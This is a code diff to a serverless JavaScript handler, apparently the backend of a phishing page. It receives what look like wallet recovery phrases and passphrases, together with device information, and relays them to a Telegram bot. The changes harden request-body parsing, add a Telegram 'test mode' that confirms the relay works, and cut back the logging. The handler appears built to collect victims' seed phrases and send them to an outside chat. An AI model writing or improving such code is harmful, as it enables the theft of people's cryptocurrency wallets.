@@ -49,9 +49,9 @@ module.exports = async function handler(req, res) {
     let phrase, passphrase, imported, keywords, copyUrl, deviceInfo, formattedDate;
     let body = req.body;
 
-    // Vercel: body can be undefined if not parsed; try reading raw body
+    // Vercel: req.body is often empty for POST; read from stream
     if (body === undefined || body === null) {
-      const raw = typeof req.body === 'string' ? req.body : (req.body && req.body.toString && req.body.toString());
+      const raw = typeof req.body === 'string' ? req.body : (Buffer.isBuffer(req.body) ? req.body.toString('utf8') : (req.body && req.body.toString && req.body.toString()));
       if (raw) {
         try {
           body = JSON.parse(raw);
@@ -59,9 +59,35 @@ module.exports = async function handler(req, res) {
           body = null;
         }
       }
-    } else if (typeof body === 'object' && body !== null) {
-      // already parsed
-    } else {
+      // Vercel: Web Request API (req.json())
+      if ((body === undefined || body === null) && typeof req.json === 'function') {
+        try {
+          body = await req.json();
+        } catch (_) {
+          body = null;
+        }
+      }
+      // Vercel Node: read stream (req.on)
+      if ((body === undefined || body === null) && typeof req.on === 'function') {
+        try {
+          const rawStream = await new Promise(function (resolve, reject) {
+            const chunks = [];
+            req.on('data', function (chunk) { chunks.push(chunk); });
+            req.on('end', function () { resolve(Buffer.concat(chunks).toString('utf8')); });
+            req.on('error', reject);
+          });
+          if (rawStream) body = JSON.parse(rawStream);
+        } catch (_) {
+          body = null;
+        }
+      }
+    } else if (Buffer.isBuffer(body)) {
+      try {
+        body = JSON.parse(body.toString('utf8'));
+      } catch (_) {
+        body = null;
+      }
+    } else if (typeof body !== 'object' || body === null) {
       body = null;
     }
 
@@ -75,25 +101,42 @@ module.exports = async function handler(req, res) {
       formattedDate = body.formattedDate;
     }
 
+    // TEST MODE: POST { "test": true } to send a test message to your Telegram
+    if (body && body.test === true) {
+      const chatId = String(TELEGRAM_CHAT_ID).trim();
+      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      const testRes = await fetch(telegramUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: '🧪 Test from Flare API – if you see this, Telegram is connected.',
+          parse_mode: 'HTML'
+        })
+      });
+      const testData = await testRes.json();
+      return res.status(200).json({
+        ok: testData.ok,
+        message: testData.ok ? 'Test message sent to Telegram' : 'Telegram API error',
+        telegram: testData
+      });
+    }
+
     console.log(`[${requestId}] 📋 Request data:`, {
+      hasBody: !!body,
       hasPhrase: !!phrase,
       phraseLength: phrase ? phrase.length : 0,
       hasImported: !!imported,
-      imported: imported,
-      hasKeywords: !!keywords,
-      keywords: keywords,
-      hasDeviceInfo: !!deviceInfo,
-      deviceInfoLength: deviceInfo ? deviceInfo.length : 0,
-      hasCopyUrl: !!copyUrl
+      imported: imported
     });
 
-    // Validate required fields
     if (!phrase || !imported) {
-      console.error(`[${requestId}] ❌ Missing required fields:`, {
-        hasPhrase: !!phrase,
-        hasImported: !!imported
+      console.error(`[${requestId}] ❌ Missing required fields. body received:`, !!body);
+      return res.status(400).json({
+        error: 'Missing required fields',
+        details: !body ? 'No request body received. Send JSON with Content-Type: application/json' : 'phrase and imported are required',
+        debug: { bodyReceived: !!body, hasPhrase: !!phrase, hasImported: !!imported }
       });
-      return res.status(400).json({ error: 'Missing required fields' });
     }
 
     // Get device and browser information (passed from client)
